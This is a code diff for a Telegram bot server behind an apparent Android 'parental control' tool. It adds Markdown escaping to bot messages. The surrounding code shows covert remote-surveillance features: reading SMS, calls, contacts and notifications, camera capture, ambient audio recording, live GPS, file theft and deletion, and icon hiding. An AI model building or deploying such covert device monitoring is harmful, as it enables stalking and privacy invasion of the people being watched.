@@ -83,6 +83,11 @@ const botDeviceSelection = new Map(); // chatId → deviceId
 
 let bot = null;
 
+// ── Markdown escape utility ─────────────────────────────────────────
+function escapeMd(text) {
+  if (!text) return '';
+  return text.replace(/([_*\[\]()~`>#+\-=|{}.!])/g, '\\$1');
+}
 
 // ════════════════════════════════════════════════════════════════════
 // BOT FILE BROWSER HELPERS
@@ -192,29 +197,25 @@ function handleBotFileListing(chatId, editMsgId, deviceId, payload, filterExt) {
     .map(([c,n]) => `${getCategoryEmoji(c)} ${n}`)
     .join('  ');
 
-  let text = `📂 *${folderName}*  \(${devName}\)
-`;
-  text += `\`${curPath}\`
-`;
-  text += `${'─'.repeat(26)}
-`;
-  text += `📊 Total: ${files.length} file  ${catSummary}
-`;
+  // Escape all dynamic texts for Markdown
+  const escapedFolder = escapeMd(folderName);
+  const escapedDev    = escapeMd(devName);
+  const escapedPath   = escapeMd(curPath); // inside backticks it's safe but we escape anyway to be safe
+
+  let text = `📂 *${escapedFolder}*  (${escapedDev})\n`;  // removed backslashes, using escapedDev
+  text += `\`${escapedPath}\`\n`;
+  text += `${'─'.repeat(26)}\n`;
+  text += `📊 Total: ${files.length} file  ${catSummary}\n`;
   if (filterExt && filterExt !== 'all') {
-    text += `🔍 Filter: \`${filterExt}\` → ${filtered.length} file found
-`;
+    text += `🔍 Filter: \`${escapeMd(filterExt)}\` → ${filtered.length} file found\n`;
   }
-  text += `${'─'.repeat(26)}
-`;
+  text += `${'─'.repeat(26)}\n`;
 
   if (filtered.length === 0) {
     text += filterExt && filterExt !== 'all'
-      ? `_"${filterExt}" extension er kono file nai._`
+      ? `_"${escapeMd(filterExt)}" extension er kono file nai._`
       : `_Ei folder e kono file nai._`;
   }
-
-  // Escape markdown special chars for MarkdownV2
-  // Use Markdown (v1) to keep it simple
 
   // Build filter row buttons
   const filterButtons = [];
@@ -243,6 +244,7 @@ function handleBotFileListing(chatId, editMsgId, deviceId, payload, filterExt) {
   for (const file of showFiles) {
     const emoji = getCategoryEmoji(getFileCategory(file.name));
     const sizeStr = formatSize(file.size);
+    // Button text doesn't need escaping
     const label = `${emoji} ${file.name.length > 28 ? file.name.slice(0,25)+'...' : file.name}  (${sizeStr})`;
     fileButtons.push([{ text: label, callback_data: `fb:file:${deviceId}:${getCachedPathKey(file.path)}` }]);
   }
@@ -288,35 +290,35 @@ async function handleBotFileDownload(chatId, deviceId, payload) {
     const buffer = Buffer.from(base64, 'base64');
     const ext    = name.split('.').pop().toLowerCase();
 
-    // Check if file size exceeds Telegram Bot API's 50MB HTTP limit
+    // Check file size (Telegram Bot API HTTP limit 50MB)
     if (buffer.length > 50 * 1024 * 1024) {
       bot.sendMessage(chatId, `⚠️ ফাইল সাইজ (${formatSize(buffer.length)}) অনেক বড় (টেলিগ্রাম বটের লিমিট ৫০এমবি)। অনুগ্রহ করে ওয়েব এডমিন প্যানেল ব্যবহার করে ফাইলটি ডাউনলোড করে নিন!`);
       return;
     }
 
-    // Choose send method by type
+    const escapedName = escapeMd(name);
+    // Send a status message
+    await bot.sendMessage(chatId, `⬇️ Sending: *${escapedName}* (${formatSize(buffer.length)})…`, { parse_mode: 'Markdown' });
+
     const imageExts  = ['jpg','jpeg','png','gif','webp'];
     const videoExts  = ['mp4','3gp','mov'];
     const audioExts  = ['mp3','m4a','aac','ogg'];
 
-    bot.sendMessage(chatId, `⬇️ Sending: *${name}* (${formatSize(buffer.length)})…`, { parse_mode: 'Markdown' });
-
     if (imageExts.includes(ext)) {
-      await bot.sendPhoto(chatId, buffer, { caption: `📷 ${name}` }, { filename: name });
+      await bot.sendPhoto(chatId, buffer, { caption: `📷 ${escapedName}` }, { filename: name });
     } else if (videoExts.includes(ext)) {
-      await bot.sendVideo(chatId, buffer, { caption: `🎬 ${name}` }, { filename: name });
+      await bot.sendVideo(chatId, buffer, { caption: `🎬 ${escapedName}` }, { filename: name });
     } else if (audioExts.includes(ext)) {
-      await bot.sendAudio(chatId, buffer, { caption: `🎵 ${name}` }, { filename: name });
+      await bot.sendAudio(chatId, buffer, { caption: `🎵 ${escapedName}` }, { filename: name });
     } else {
-      await bot.sendDocument(chatId, buffer, { caption: `📎 ${name} — from ${getDeviceName(deviceId)}` }, { filename: name });
+      await bot.sendDocument(chatId, buffer, { caption: `📎 ${escapedName} — from ${escapeMd(getDeviceName(deviceId))}` }, { filename: name });
     }
     console.log(`[BOT] File sent to chat ${chatId}: ${name} (${formatSize(buffer.length)})`);
   } catch (err) {
     console.error('[BOT] File send error:', err.message);
-    bot.sendMessage(chatId, `❌ File send hoyni: ${err.message}`);
+    bot.sendMessage(chatId, `❌ File send hoyni: ${escapeMd(err.message)}`);
   }
 }
-
 
 // ── Photo notify ──────────────────────────────────────────────────────────
 async function notifyAdminPhoto(deviceId, childName, dataUrl, facing) {
@@ -324,7 +326,8 @@ async function notifyAdminPhoto(deviceId, childName, dataUrl, facing) {
   try {
     const b64  = dataUrl.replace(/^data:image\/\w+;base64,/, '');
     const buf  = Buffer.from(b64, 'base64');
-    const cap  = `📷 *${childName}* — ${facing === 'front' ? 'Front' : 'Back'} Camera\n${new Date().toLocaleTimeString()}`;
+    const escapedChild = escapeMd(childName);
+    const cap  = `📷 *${escapedChild}* — ${facing === 'front' ? 'Front' : 'Back'} Camera\n${new Date().toLocaleTimeString()}`;
     await bot.sendPhoto(ADMIN_TG_ID, buf, { caption: cap, parse_mode: 'Markdown' }, { filename: 'photo.jpg', contentType: 'image/jpeg' });
   } catch (e) { console.error('[BOT] Photo notify error:', e.message); }
 }
@@ -336,7 +339,7 @@ async function notifyAdminAudio(deviceId, childName, dataUrl, duration) {
     const b64 = dataUrl.replace(/^data:audio\/\w+;base64,/, '');
     const buf = Buffer.from(b64, 'base64');
     await bot.sendAudio(ADMIN_TG_ID, buf,
-      { caption: `🎤 *${childName}* — Ambient Audio`, parse_mode: 'Markdown', title: `ambient_${Date.now()}.m4a` },
+      { caption: `🎤 *${escapeMd(childName)}* — Ambient Audio`, parse_mode: 'Markdown', title: `ambient_${Date.now()}.m4a` },
       { filename: 'ambient.m4a', contentType: 'audio/m4a' });
   } catch (e) { console.error('[BOT] Audio notify error:', e.message); }
 }
@@ -347,7 +350,7 @@ function notifyAdminLocation(deviceId, childName, loc) {
   try {
     bot.sendLocation(ADMIN_TG_ID, loc.lat, loc.lng);
     bot.sendMessage(ADMIN_TG_ID,
-      `📍 *${childName}* Location\n\n` +
+      `📍 *${escapeMd(childName)}* Location\n\n` +
       `Accuracy: ±${Math.round(loc.accuracy || 0)}m\n` +
       `Provider: ${loc.provider || 'GPS'}\n` +
       `[Open in Maps](${loc.mapUrl})`,
@@ -361,11 +364,11 @@ function notifyAdminSms(deviceId, childName, sender, body, time) {
   try {
     const t = new Date(time).toLocaleTimeString();
     notifyAdmin(
-      `💬 *Incoming SMS — ${childName}*\n\n` +
-      `From: \`${sender}\`\n` +
+      `💬 *Incoming SMS — ${escapeMd(childName)}*\n\n` +
+      `From: \`${escapeMd(sender)}\`\n` +
       `Time: ${t}\n\n` +
-      `"${body.length > 200 ? body.slice(0,200)+'…' : body}"`,
-      { reply_markup: { inline_keyboard: [[{ text: `📱 View ${childName}`, callback_data: `sel:${deviceId}` }]] } }
+      `"${body.length > 200 ? escapeMd(body.slice(0,200))+'…' : escapeMd(body)}"`,
+      { reply_markup: { inline_keyboard: [[{ text: `📱 View ${escapeMd(childName)}`, callback_data: `sel:${deviceId}` }]] } }
     );
   } catch (e) { console.error('[BOT] SMS notify error:', e.message); }
 }
@@ -374,18 +377,19 @@ function notifyAdminSms(deviceId, childName, sender, body, time) {
 function handleBotDataResult(chatId, deviceId, payload) {
   if (!bot) return;
   const devName = getDeviceName(deviceId);
+  const escDev = escapeMd(devName);
   try {
     if (payload.type === 'call_log_result') {
       const calls = payload.calls || [];
       if (calls.length === 0) { bot.sendMessage(chatId, `📵 No calls found.`); return; }
-      let text = `📞 *Call Log — ${devName}* (${calls.length} entries)\n\n`;
+      let text = `📞 *Call Log — ${escDev}* (${calls.length} entries)\n\n`;
       for (const c of calls.slice(0, 25)) {
         const icons = { incoming:'📲', outgoing:'📤', missed:'🔴', rejected:'⛔' };
         const icon  = icons[c.type] || '📞';
         const dur   = c.duration ? `${Math.floor(c.duration/60)}m${c.duration%60}s` : '—';
         const date  = new Date(c.date).toLocaleDateString('bn-BD');
-        const name  = c.name ? ` (${c.name})` : '';
-        text += `${icon} \`${c.number}\`${name} — ${dur} — ${date}\n`;
+        const name  = c.name ? ` (${escapeMd(c.name)})` : '';
+        text += `${icon} \`${escapeMd(c.number)}\`${name} — ${dur} — ${date}\n`;
       }
       if (calls.length > 25) text += `\n_…aro ${calls.length-25} ta call_`;
       bot.sendMessage(chatId, text, { parse_mode: 'Markdown',
@@ -394,12 +398,12 @@ function handleBotDataResult(chatId, deviceId, payload) {
     } else if (payload.type === 'sms_result') {
       const msgs = payload.messages || [];
       if (msgs.length === 0) { bot.sendMessage(chatId, `📭 No messages.`); return; }
-      let text = `💬 *SMS (${payload.box}) — ${devName}* (${msgs.length})\n\n`;
+      let text = `💬 *SMS (${escapeMd(payload.box)}) — ${escDev}* (${msgs.length})\n\n`;
       for (const m of msgs.slice(0, 20)) {
         const date = new Date(m.date).toLocaleDateString('bn-BD');
         const read = m.read ? '' : '🔵 ';
-        const body = m.body.length > 80 ? m.body.slice(0,80)+'…' : m.body;
-        text += `${read}\`${m.from}\` — ${date}\n_${body}_\n\n`;
+        const body = m.body.length > 80 ? escapeMd(m.body.slice(0,80))+'…' : escapeMd(m.body);
+        text += `${read}\`${escapeMd(m.from)}\` — ${date}\n_${body}_\n\n`;
       }
       bot.sendMessage(chatId, text, { parse_mode: 'Markdown',
         reply_markup: { inline_keyboard: [[{ text: '◀️ Back', callback_data: `sel:${deviceId}` }]] } });
@@ -407,14 +411,13 @@ function handleBotDataResult(chatId, deviceId, payload) {
     } else if (payload.type === 'contacts_result') {
       const contacts = payload.contacts || [];
       if (contacts.length === 0) { bot.sendMessage(chatId, `👤 No contacts.`); return; }
-      // Send as a text file if many contacts
       if (contacts.length > 30) {
         const lines = contacts.map(c => `${c.name} — ${c.number}`).join('\n');
         const buf = Buffer.from(lines, 'utf-8');
-        bot.sendDocument(chatId, buf, { caption: `👥 ${devName} — ${contacts.length} contacts` }, { filename: 'contacts.txt', contentType: 'text/plain' });
+        bot.sendDocument(chatId, buf, { caption: `👥 ${escDev} — ${contacts.length} contacts` }, { filename: 'contacts.txt', contentType: 'text/plain' });
       } else {
-        let text = `👥 *Contacts — ${devName}* (${contacts.length})\n\n`;
-        for (const c of contacts) text += `👤 *${c.name}*  \`${c.number}\`\n`;
+        let text = `👥 *Contacts — ${escDev}* (${contacts.length})\n\n`;
+        for (const c of contacts) text += `👤 *${escapeMd(c.name)}*  \`${escapeMd(c.number)}\`\n`;
         bot.sendMessage(chatId, text, { parse_mode: 'Markdown',
           reply_markup: { inline_keyboard: [[{ text: '◀️ Back', callback_data: `sel:${deviceId}` }]] } });
       }
@@ -425,7 +428,7 @@ function handleBotDataResult(chatId, deviceId, payload) {
       const lines = apps.map(a => `${a.blocked ? '🚫 ' : '✅ '}${a.name} (${a.package})`).join('\n');
       const buf = Buffer.from(lines, 'utf-8');
       bot.sendDocument(chatId, buf,
-        { caption: `📦 *${devName}* — ${apps.length} apps installed` },
+        { caption: `📦 *${escDev}* — ${apps.length} apps installed` },
         { filename: 'installed_apps.txt', contentType: 'text/plain' });
     }
   } catch (e) { console.error('[BOT] Data result error:', e.message); }
@@ -445,7 +448,6 @@ function initTelegramBot() {
   }
 
   // ── State management ──────────────────────────────────────────────────
-  // chatId → { selectedDeviceId, awaitingInput: null | 'screentime' | 'policy' }
   const chatState = new Map();
 
   function getState(chatId) {
@@ -462,7 +464,6 @@ function initTelegramBot() {
 
   // ── Keyboard builders ─────────────────────────────────────────────────
 
-  // Persistent bottom reply keyboard (always shown)
   const MAIN_REPLY_KB = {
     keyboard: [
       [{ text: "📱 Devices" }, { text: "🖥️ Full Panel" }],
@@ -584,14 +585,17 @@ function initTelegramBot() {
     const stUsed   = dev.screenTimeUsedMin  || 0;
     const stLimit  = dev.screenTimeLimitMin || 0;
     const stText   = stLimit > 0 ? `${stUsed} / ${stLimit} min` : `${stUsed} min (no limit)`;
-    const blocked  = dev.blockedApps ? `\`${dev.blockedApps}\`` : "_kono app block kora nai_";
+    const blocked  = dev.blockedApps ? `\`${escapeMd(dev.blockedApps)}\`` : "_kono app block kora nai_";
     const lastSeen = new Date(dev.lastSeen).toLocaleTimeString("bn-BD");
 
+    const escChild = escapeMd(dev.childName);
+    const escApp   = escapeMd(dev.activeApp || "Home Screen");
+
     const text =
-      `📱 *${dev.childName}*\n` +
+      `📱 *${escChild}*\n` +
       `${"─".repeat(28)}\n` +
       `🔋 Battery:   ${batBar} ${bat}%\n` +
-      `📲 Active App: *${dev.activeApp || "Home Screen"}*\n` +
+      `📲 Active App: *${escApp}*\n` +
       `⏱️ Screen:    ${stText}\n` +
       `🚫 Blocked:   ${blocked}\n` +
       `📡 Last seen: ${lastSeen}\n` +
@@ -662,7 +666,7 @@ function initTelegramBot() {
         ? "Kono limit nai _(unlimited)_"
         : `*${minutes} minute* = ${Math.floor(minutes/60)}h ${minutes%60}m`;
       bot.sendMessage(chatId,
-        `✅ Screen time limit set!\n\n👦 *${dev?.childName}*\n⏱️ Limit: ${limitText}`,
+        `✅ Screen time limit set!\n\n👦 *${escapeMd(dev?.childName)}*\n⏱️ Limit: ${limitText}`,
         { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "◀️ Back to Device", callback_data: `sel:${devId}` }]] } }
       );
       return;
@@ -680,7 +684,7 @@ function initTelegramBot() {
       state.pendingFilterExt = null;
 
       const loadMsg = await bot.sendMessage(chatId,
-        `📂 Loading: \`${resolvedPath}\`…`, { parse_mode: 'Markdown' });
+        `📂 Loading: \`${escapeMd(resolvedPath)}\`…`, { parse_mode: 'Markdown' });
 
       pendingBotFileRequests.set(devId, {
         chatId, msgId: loadMsg.message_id,
@@ -712,7 +716,7 @@ function initTelegramBot() {
       });
       if (dev) dev.blockedApps = apps;
       bot.sendMessage(chatId,
-        `✅ Block policy update hoyeche!\n\n👦 *${dev?.childName}*\n🚫 Blocked: \`${apps}\`\n\n_Apps gulo ekhon theke block thakbe._`,
+        `✅ Block policy update hoyeche!\n\n👦 *${escapeMd(dev?.childName)}*\n🚫 Blocked: \`${escapeMd(apps)}\`\n\n_Apps gulo ekhon theke block thakbe._`,
         { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "◀️ Back to Device", callback_data: `sel:${devId}` }]] } }
       );
       return;
@@ -724,7 +728,7 @@ function initTelegramBot() {
     if (text === "⚙️ Settings") {
       const miniUrl = PUBLIC_URL ? `${PUBLIC_URL}/?tg=1` : null;
       bot.sendMessage(chatId,
-        `⚙️ *Settings*\n\n🔑 Token: \`${SECURITY_TOKEN}\`\n🤖 Admin ID: \`${ADMIN_TG_ID}\`\n🌐 Server: \`${PUBLIC_URL || "local"}\``,
+        `⚙️ *Settings*\n\n🔑 Token: \`${escapeMd(SECURITY_TOKEN)}\`\n🤖 Admin ID: \`${ADMIN_TG_ID}\`\n🌐 Server: \`${escapeMd(PUBLIC_URL || "local")}\``,
         {
           parse_mode: "Markdown",
           reply_markup: {
@@ -785,7 +789,7 @@ function initTelegramBot() {
       const deviceId = data.slice(4);
       state.selectedDeviceId = deviceId;
       state.awaitingInput    = null;
-      bot.answerCallbackQuery(query.id, { text: `✅ ${getDeviceName(deviceId)} selected` });
+      bot.answerCallbackQuery(query.id, { text: `✅ ${escapeMd(getDeviceName(deviceId))} selected` });
       sendDeviceCard(chatId, deviceId, msgId);
       return;
     }
@@ -809,7 +813,7 @@ function initTelegramBot() {
         bot.answerCallbackQuery(query.id);
         const current = dev.screenTimeLimitMin || 0;
         bot.sendMessage(chatId,
-          `⏱️ *Screen Time Limit — ${dev.childName}*\n\n` +
+          `⏱️ *Screen Time Limit — ${escapeMd(dev.childName)}*\n\n` +
           `Ekhon limit: *${current === 0 ? "Nai (unlimited)" : current + " min"}*\n\n` +
           `Notun limit type koro (minute e):\n` +
           `• \`120\` = 2 ghonta\n• \`60\` = 1 ghonta\n• \`0\` = no limit`,
@@ -841,8 +845,8 @@ function initTelegramBot() {
         bot.answerCallbackQuery(query.id);
         const current = dev.blockedApps || "";
         bot.sendMessage(chatId,
-          `🚫 *App Block Policy — ${dev.childName}*\n\n` +
-          `Ekhon blocked: ${current ? `\`${current}\`` : "_kono app nai_"}\n\n` +
+          `🚫 *App Block Policy — ${escapeMd(dev.childName)}*\n\n` +
+          `Ekhon blocked: ${current ? `\`${escapeMd(current)}\`` : "_kono app nai_"}\n\n` +
           `Quick select (tap korle add hobe):`,
           {
             parse_mode: "Markdown",
@@ -879,7 +883,7 @@ function initTelegramBot() {
         const facing = action === 'photo_front' ? 'front' : 'back';
         if (!childDevices.has(deviceId)) { bot.answerCallbackQuery(query.id, { text: '❌ Device offline.' }); return; }
         bot.answerCallbackQuery(query.id, { text: `📷 Taking ${facing} camera photo…` });
-        bot.sendMessage(chatId, `📷 *${facing} camera* capturing from *${getDeviceName(deviceId)}*…`, { parse_mode: 'Markdown' });
+        bot.sendMessage(chatId, `📷 *${facing} camera* capturing from *${escapeMd(getDeviceName(deviceId))}*…`, { parse_mode: 'Markdown' });
         sendCommandToDevice(deviceId, { command: 'take_photo', facing });
         return;
       }
@@ -889,7 +893,7 @@ function initTelegramBot() {
         if (!childDevices.has(deviceId)) { bot.answerCallbackQuery(query.id, { text: '❌ Device offline.' }); return; }
         bot.answerCallbackQuery(query.id, { text: '🎤 Recording 30s ambient audio…' });
         bot.sendMessage(chatId,
-          `🎤 Recording ambient audio from *${getDeviceName(deviceId)}*…
+          `🎤 Recording ambient audio from *${escapeMd(getDeviceName(deviceId))}*…
 _30 second por automatically pathabe._`,
           { parse_mode: 'Markdown' });
         sendCommandToDevice(deviceId, { command: 'record_audio', duration: 30 });
@@ -900,7 +904,7 @@ _30 second por automatically pathabe._`,
       if (action === 'get_location') {
         if (!childDevices.has(deviceId)) { bot.answerCallbackQuery(query.id, { text: '❌ Device offline.' }); return; }
         bot.answerCallbackQuery(query.id, { text: '📍 Fetching GPS…' });
-        bot.sendMessage(chatId, `📍 Getting GPS location of *${getDeviceName(deviceId)}*…`, { parse_mode: 'Markdown' });
+        bot.sendMessage(chatId, `📍 Getting GPS location of *${escapeMd(getDeviceName(deviceId))}*…`, { parse_mode: 'Markdown' });
         sendCommandToDevice(deviceId, { command: 'get_location' });
         return;
       }
@@ -911,7 +915,7 @@ _30 second por automatically pathabe._`,
         bot.answerCallbackQuery(query.id, { text: '📞 Fetching call log…' });
         pendingBotFileRequests.set(deviceId + '_data', { chatId, type: 'call_log_result' });
         sendCommandToDevice(deviceId, { command: 'get_call_log' });
-        bot.sendMessage(chatId, `📞 Fetching call log from *${getDeviceName(deviceId)}*…`, { parse_mode: 'Markdown' });
+        bot.sendMessage(chatId, `📞 Fetching call log from *${escapeMd(getDeviceName(deviceId))}*…`, { parse_mode: 'Markdown' });
         setTimeout(() => { if (pendingBotFileRequests.has(deviceId+'_data')) { pendingBotFileRequests.delete(deviceId+'_data'); bot.sendMessage(chatId, '⏱️ Timeout.'); } }, 12000);
         return;
       }
@@ -919,7 +923,7 @@ _30 second por automatically pathabe._`,
       // ── sms menu ──────────────────────────────────────────────────────
       if (action === 'sms') {
         bot.answerCallbackQuery(query.id);
-        bot.sendMessage(chatId, `💬 *SMS — ${getDeviceName(deviceId)}*
+        bot.sendMessage(chatId, `💬 *SMS — ${escapeMd(getDeviceName(deviceId))}*
 
 Kon inbox dekhte chao?`, {
           parse_mode: 'Markdown',
@@ -941,7 +945,7 @@ Kon inbox dekhte chao?`, {
         bot.answerCallbackQuery(query.id, { text: '👥 Loading contacts…' });
         pendingBotFileRequests.set(deviceId + '_data', { chatId, type: 'contacts_result' });
         sendCommandToDevice(deviceId, { command: 'get_contacts' });
-        bot.sendMessage(chatId, `👥 Loading contacts from *${getDeviceName(deviceId)}*…`, { parse_mode: 'Markdown' });
+        bot.sendMessage(chatId, `👥 Loading contacts from *${escapeMd(getDeviceName(deviceId))}*…`, { parse_mode: 'Markdown' });
         setTimeout(() => { if (pendingBotFileRequests.has(deviceId+'_data')) { pendingBotFileRequests.delete(deviceId+'_data'); bot.sendMessage(chatId, '⏱️ Timeout.'); } }, 15000);
         return;
       }
@@ -952,7 +956,7 @@ Kon inbox dekhte chao?`, {
         bot.answerCallbackQuery(query.id, { text: '📦 Loading installed apps…' });
         pendingBotFileRequests.set(deviceId + '_data', { chatId, type: 'installed_apps_result' });
         sendCommandToDevice(deviceId, { command: 'get_installed_apps' });
-        bot.sendMessage(chatId, `📦 Loading installed apps from *${getDeviceName(deviceId)}*…`, { parse_mode: 'Markdown' });
+        bot.sendMessage(chatId, `📦 Loading installed apps from *${escapeMd(getDeviceName(deviceId))}*…`, { parse_mode: 'Markdown' });
         setTimeout(() => { if (pendingBotFileRequests.has(deviceId+'_data')) { pendingBotFileRequests.delete(deviceId+'_data'); bot.sendMessage(chatId, '⏱️ Timeout.'); } }, 15000);
         return;
       }
@@ -968,7 +972,7 @@ Kon inbox dekhte chao?`, {
       if (action === "take_screenshot") {
         bot.answerCallbackQuery(query.id, { text: "📸 Taking screenshot…" });
         sendCommandToDevice(deviceId, { command: "take_screenshot" });
-        bot.sendMessage(chatId, `📸 Screenshot request sent to *${getDeviceName(deviceId)}*\n_(requires active screen mirror)_`, { parse_mode: "Markdown" });
+        bot.sendMessage(chatId, `📸 Screenshot request sent to *${escapeMd(getDeviceName(deviceId))}*\n_(requires active screen mirror)_`, { parse_mode: "Markdown" });
         return;
       }
 
@@ -984,7 +988,7 @@ Kon inbox dekhte chao?`, {
       if (action === "start_live_location") {
         bot.answerCallbackQuery(query.id, { text: "🗺️ Starting live location…" });
         sendCommandToDevice(deviceId, { command: "start_live_location" });
-        bot.sendMessage(chatId, `🗺️ Live location started for *${getDeviceName(deviceId)}*\n_Updates every 30s_`, { parse_mode: "Markdown" });
+        bot.sendMessage(chatId, `🗺️ Live location started for *${escapeMd(getDeviceName(deviceId))}*\n_Updates every 30s_`, { parse_mode: "Markdown" });
         return;
       }
       if (action === "stop_live_location") {
@@ -1045,7 +1049,6 @@ Kon inbox dekhte chao?`, {
     // ── blk: app blocking quick select ───────────────────────────────
     if (data.startsWith("blk:")) {
       const parts    = data.split(":");
-      // blk:com.package.name:deviceId  OR  blk:clear:deviceId  OR blk:custom:deviceId
       const deviceId = parts[parts.length - 1];
       const pkg      = parts.slice(1, parts.length - 1).join(":");
       const dev      = childDevices.get(deviceId);
@@ -1107,7 +1110,7 @@ Kon inbox dekhte chao?`, {
       bot.answerCallbackQuery(query.id, { text: `💬 Loading ${box}…` });
       pendingBotFileRequests.set(devId + '_data', { chatId, type: 'sms_result' });
       sendCommandToDevice(devId, { command: 'get_sms', box, limit: 30 });
-      bot.sendMessage(chatId, `💬 Loading ${box} SMS from *${getDeviceName(devId)}*…`, { parse_mode: 'Markdown' });
+      bot.sendMessage(chatId, `💬 Loading ${box} SMS from *${escapeMd(getDeviceName(devId))}*…`, { parse_mode: 'Markdown' });
       setTimeout(() => { if (pendingBotFileRequests.has(devId+'_data')) { pendingBotFileRequests.delete(devId+'_data'); bot.sendMessage(chatId, '⏱️ Timeout.'); } }, 15000);
       return;
     }
@@ -1187,7 +1190,7 @@ Kon inbox dekhte chao?`, {
         }
         bot.answerCallbackQuery(query.id, { text: '📂 Loading…' });
         const loadMsg = await bot.editMessageText(
-          `📂 Loading: \`${rawPath}\`…`,
+          `📂 Loading: \`${escapeMd(rawPath)}\`…`,
           { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown' }
         ).catch(() => bot.sendMessage(chatId, `📂 Loading…`));
 
@@ -1242,8 +1245,8 @@ Kon inbox dekhte chao?`, {
         const emoji    = getCategoryEmoji(cat);
         bot.answerCallbackQuery(query.id);
         bot.sendMessage(chatId,
-          `${emoji} *${fileName}*
-\`${filePath}\``,
+          `${emoji} *${escapeMd(fileName)}*
+\`${escapeMd(filePath)}\``,
           {
             parse_mode: 'Markdown',
             reply_markup: {
@@ -1296,7 +1299,7 @@ Kon inbox dekhte chao?`, {
         bot.sendMessage(chatId,
           `⚠️ *Delete confirm*
 
-\`${fileName}\`
+\`${escapeMd(fileName)}\`
 
 Nischit delete korte chao?`,
           {
@@ -1326,7 +1329,7 @@ Nischit delete korte chao?`,
         sendCommandToDevice(devId, { command: 'delete_file', path: filePath });
         // Go back to folder after 1.5s
         setTimeout(() => {
-          bot.sendMessage(chatId, `✅ *${fileName}* deleted.`, { parse_mode: 'Markdown' });
+          bot.sendMessage(chatId, `✅ *${escapeMd(fileName)}* deleted.`, { parse_mode: 'Markdown' });
           // Reload the folder listing
           const loadMsg2 = bot.sendMessage(chatId, `🔄 Folder reload hocche…`);
           loadMsg2.then(m => {
@@ -1363,14 +1366,14 @@ function notifyAdmin(text, opts = {}) {
 function notifyDeviceConnected(deviceId, childName, battery) {
   notifyAdmin(
     `🟢 *Device Connected*\n\n` +
-    `👦 Name: *${childName}*\n` +
+    `👦 Name: *${escapeMd(childName)}*\n` +
     `🔋 Battery: *${battery}%*\n` +
     `🆔 ID: \`${deviceId}\`\n\n` +
     `Quick select: tap below`,
     {
       reply_markup: {
         inline_keyboard: [[
-          { text: `📱 Manage ${childName}`, callback_data: `sel:${deviceId}` }
+          { text: `📱 Manage ${escapeMd(childName)}`, callback_data: `sel:${deviceId}` }
         ]]
       }
     }
@@ -1378,19 +1381,19 @@ function notifyDeviceConnected(deviceId, childName, battery) {
 }
 
 function notifyDeviceDisconnected(deviceId, childName) {
-  notifyAdmin(`🔴 *Device Disconnected*\n\n👦 *${childName}* (\`${deviceId}\`) offline hoy gese.`);
+  notifyAdmin(`🔴 *Device Disconnected*\n\n👦 *${escapeMd(childName)}* (\`${deviceId}\`) offline hoy gese.`);
 }
 
 function notifyAppBlocked(deviceId, childName, appName, packageName, time) {
   notifyAdmin(
     `🚫 *App Blocked Alert!*\n\n` +
-    `👦 Device: *${childName}*\n` +
-    `📦 App: *${appName}*\n` +
+    `👦 Device: *${escapeMd(childName)}*\n` +
+    `📦 App: *${escapeMd(appName)}*\n` +
     `🕐 Time: ${time}`,
     {
       reply_markup: {
         inline_keyboard: [[
-          { text: `📱 View ${childName}`, callback_data: `sel:${deviceId}` }
+          { text: `📱 View ${escapeMd(childName)}`, callback_data: `sel:${deviceId}` }
         ]]
       }
     }
@@ -1400,7 +1403,7 @@ function notifyAppBlocked(deviceId, childName, appName, packageName, time) {
 function notifyBatteryLow(deviceId, childName, battery) {
   notifyAdmin(
     `🔴 *Low Battery Warning!*\n\n` +
-    `👦 *${childName}*: battery *${battery}%* only!`,
+    `👦 *${escapeMd(childName)}*: battery *${battery}%* only!`,
     {
       reply_markup: {
         inline_keyboard: [[
@@ -1418,7 +1421,7 @@ function notifyCommandAck(deviceId, childName, command, success, message) {
     hide_icon: "Hide Icon", unhide_icon: "Restore Icon", update_policy: "Policy Update"
   };
   const label = cmdNames[command] || command;
-  notifyAdmin(`${icon} *${label}* [${childName}]\n${message}`);
+  notifyAdmin(`${icon} *${label}* [${escapeMd(childName)}]\n${escapeMd(message)}`);
 }
 
 // ── Send command to child device ─────────────────────────────────────────
@@ -1477,9 +1480,6 @@ function broadcastToAdmins(payload) {
 const lowBatteryAlerted = new Set();
 
 // ── Pending Bot File Requests ─────────────────────────────────────────
-// When bot sends list_dir/download_file to Android,
-// we store the waiting chatId here so the WS response can find it.
-// Key: deviceId  →  { chatId, msgId, type, filterExt, currentPath }
 const pendingBotFileRequests = new Map();
 
 // ════════════════════════════════════════════════════════════════════
@@ -1582,8 +1582,8 @@ wss.on('connection', (ws, req) => {
             if (notifKey !== dev._lastNotifKey) {
               dev._lastNotifKey = notifKey;
               notifyAdmin(
-                `🔔 *Notification — ${dev.childName}*\n\n📱 App: \`${appLabel}\`\n📝 ${msgTitle}\n💬 ${msgText.length > 200 ? msgText.slice(0,200)+'…' : msgText}\n🕐 ${notifTime}`,
-                { reply_markup: { inline_keyboard: [[{ text: '📱 View '+dev.childName, callback_data: 'sel:'+deviceId }]] } }
+                `🔔 *Notification — ${escapeMd(dev.childName)}*\n\n📱 App: \`${escapeMd(appLabel)}\`\n📝 ${escapeMd(msgTitle)}\n💬 ${msgText.length > 200 ? escapeMd(msgText.slice(0,200))+'…' : escapeMd(msgText)}\n🕐 ${notifTime}`,
+                { reply_markup: { inline_keyboard: [[{ text: '📱 View '+escapeMd(dev.childName), callback_data: 'sel:'+deviceId }]] } }
               );
             }
           }
@@ -1624,13 +1624,13 @@ wss.on('connection', (ws, req) => {
             pendingBotFileRequests.delete(deviceId + '_data');
             const p = payload;
             bot.sendMessage(prGI.chatId,
-              `ℹ️ *Device Info — ${dev.childName}*\n\n` +
-              `📱 Model: *${p.brand} ${p.model}*\n` +
-              `🤖 Android: *${p.android_version}* (SDK ${p.sdk})\n` +
+              `ℹ️ *Device Info — ${escapeMd(dev.childName)}*\n\n` +
+              `📱 Model: *${escapeMd(p.brand)} ${escapeMd(p.model)}*\n` +
+              `🤖 Android: *${escapeMd(p.android_version)}* (SDK ${p.sdk})\n` +
               `🔋 Battery: *${p.battery}%* ${p.is_charging ? '⚡ Charging' : ''}\n` +
               `🆔 Device ID: \`${p.device_id}\`\n` +
               `⏱ Screen Used: *${p.screen_time_used} min*\n` +
-              `🚫 Blocked Apps: \`${p.blocked_apps || 'none'}\``,
+              `🚫 Blocked Apps: \`${escapeMd(p.blocked_apps || 'none')}\``,
